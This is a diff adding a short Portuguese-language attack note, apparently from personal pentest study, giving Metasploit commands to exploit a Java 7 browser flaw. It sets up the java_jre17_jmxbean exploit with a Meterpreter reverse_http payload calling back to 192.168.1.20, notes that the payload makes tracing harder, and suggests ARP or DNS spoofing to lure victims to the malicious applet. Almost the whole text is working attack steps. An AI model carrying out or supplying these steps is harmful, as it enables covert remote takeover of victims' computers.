@@ -1,0 +1,24 @@
+O Java 7 é vulneravel. Podemos encontrar outras vulnerabilidades, lendo as informações dos exploits
+
+Para pesquisar:
+grep -i java exploit/mult
+
+Para verificar informações do exploit do java 7 por exemplo:
+info exploit/mult/browser/java_jre17_jmxbean
+
+use exploit/mult/browser/java_jre17_jmxbean
+
+set SRVHOST 192.168.1.20
+set SRVPORT 80
+set URIPATH java
+
+Usar o PAYLOAD reverse_http    (Faz tunelamento de trafego para http, otimizando e dificultando a rastreabilidade do processo e trafego)
+set PAYLOAD java/meterpreter/reverse_http
+
+set LPORT 4000
+set LHOST 192.168.1.20
+
+exploit
+
+### Fazer com que a vitima acesse o applet java no caminho "http://192.168.1.20/java"
+### Podemos usar o ARPSPOOF ou DNSSPOOF para que o usuario rode o programa de forma menos suspeita.
